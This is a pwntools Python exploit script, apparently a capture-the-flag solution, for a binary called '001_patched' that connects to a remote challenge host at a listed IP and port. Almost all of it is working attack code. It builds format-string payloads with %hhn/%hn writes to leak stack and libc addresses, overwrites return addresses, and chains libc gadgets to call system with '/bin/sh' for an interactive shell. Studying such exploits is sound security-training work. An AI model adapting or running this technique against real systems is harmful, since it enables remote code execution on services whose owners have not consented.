#!/usr/bin/env python3

from pwn import *

exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.terminal = ["foot", "-e", "sh", "-c"]

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        b* show +75
        c
        ''')

if args.REMOTE:
    conn = 'nc 14.225.212.104 9002'.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
GDB()

main = 0x4012d0
# main = 0x0000000000401246



pl = b''
# pl += b'%16$s'
pl += b'%c'*164 + f'%{4}c'.encode() + b'%hhn'+ f'%{0x146 - 168}c%hhn'.encode()
pl += b'_________%166$s%166$p%171$p%170$p%168$\x00'
# pl += b'%c'*134 + f'%{34}c'.encode() + b'%hhn'+ f'%{0xd0 + 88}c%hhn'.encode()
# pl += b'_________%136$s%138$p%141$p%140$p%138$s\x00'
# pl += b'%166$n'
# pl += b'%p_'*0x100
# pl = pl.ljust(0x50, b'a')
# pl += p64(0x4012e2 + 5)*0x20

sla(b'>', pl)

ru(b'_________')
rbp_main = u64(r(6) + b'\x00\x00')
print(f'rbp_change: {hex(rbp_main)}')
stack_2 = int(r(14), 16)
print(f'stack 2: {hex(stack_2)}')
libc.address = int(r(14), 16) - 0x2a1ca
print(f'libc: {hex(libc.address)}')
stack = int(r(14), 16) - 0x2a1ca
print(f'stack: {hex(stack)}')
rbp_3 = r(8)
print(f'variable: {(rbp_3)}')


pop_rdi = libc.address + 0x000000000010f78b
pop_rax = libc.address + 0x00000000000dd237
pop_pop = libc.address + 0x00000000001614e3 + 5

addr = []
cnt = 0
def win(x):
    global cnt
    for i in range(3):
        addr.append((((x >> (i*16)) & 0xffff) + 0x10000 * cnt))
        cnt += 1
win(pop_pop)

pl = b""

# pl += b'zzz%10$s\x00'
# pl = pl.ljust(0x20, b'a')
# pl += p64(stack_2 - 0x438)
# pl += p64(stack_2 - 0x438)
# pl += p64(stack_2 - 0x440)
# pl += p64(stack_2 - 0x448)


# pl += f'%{0xd0}c%19$hhn\x00'.encode()

info(f'addr 0: {hex(addr[0])}')
info(f'addr 1: {hex(addr[1])}')
info(f'addr 2: {hex(addr[2])}')


pl += f"%{addr[0]}c%19$hn".encode()
pl += f"%{addr[1] - addr[0]}c%20$hn".encode()
pl += f"%{addr[2] - addr[1]}c%21$hn\x00".encode()

pl = pl.ljust(0x28, b'x')
pl += p64(pop_rdi)
pl += p64(next(libc.search(b'/bin/sh')))
pl += p64(libc.sym['do_system'])
pl = pl.ljust(0x60, b'a')
pl += b'b'*8
# pl += p64(main + 115)
# pl += p64(stack_2 - 0x438)
# pl += p64(stack_2 - 0x438 + 2)
# pl += p64(stack_2 - 0x438 + 4)

pl += p64(stack_2 - 0x530)
pl += p64(stack_2 - 0x530 + 2)
pl += p64(stack_2 - 0x530 + 4)

sla(b'>', pl)
# sl(b'ls')

# sl(b'%p________'*0x10)

# print(f'[+]printf: {hex(libc.sym['printf'])}')
# print(f'[+]libc_start_main: {hex(libc.sym['__libc_start_main'] + 122)}')


p.interactive()